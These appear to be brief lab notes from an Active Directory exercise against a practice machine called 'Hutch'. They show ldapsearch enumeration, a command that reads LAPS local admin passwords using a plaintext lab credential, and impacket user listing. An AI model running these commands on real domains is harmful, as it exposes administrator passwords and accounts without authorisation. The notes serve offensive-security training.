
### LDAPSEARCH

Domain is hutch.offec

```bash
ldapsearch -x -H ldap://192.168.220.122 -b "dc=hutch,dc=offsec" > ldap_search.txt
```
#### LAPS Password Pulling

```bash
ldapsearch -x -H ldap://192.168.220.122 -b "dc=hutch,dc=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192
```

### GetAllUsers

```bash
impacket-GetADUsers -all hutch.offsec/fmcsorley:CrabSharkJellyfish192 -dc-ip 192.168.220.122 | cut -d " " -f 1 >user.txt
```
